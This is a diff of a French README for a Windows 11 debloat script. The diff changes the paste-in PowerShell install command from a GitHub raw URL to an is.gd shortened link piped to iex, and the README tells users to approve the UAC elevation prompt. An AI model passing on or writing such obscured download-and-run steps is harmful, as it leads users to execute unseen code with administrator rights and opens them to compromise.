@@ -9,7 +9,7 @@ Allège Windows 11 en une commande. Supprime le bloatware, coupe la télémétri
 Ouvrir PowerShell et coller :
 
 ```powershell
-irm https://raw.githubusercontent.com/matglitch-974/win-11/main/run.ps1|iex
+irm https://is.gd/win11install|iex
 ```
 
 Une fenêtre UAC s'ouvre — cliquer **Oui**. Le script se charge du reste.
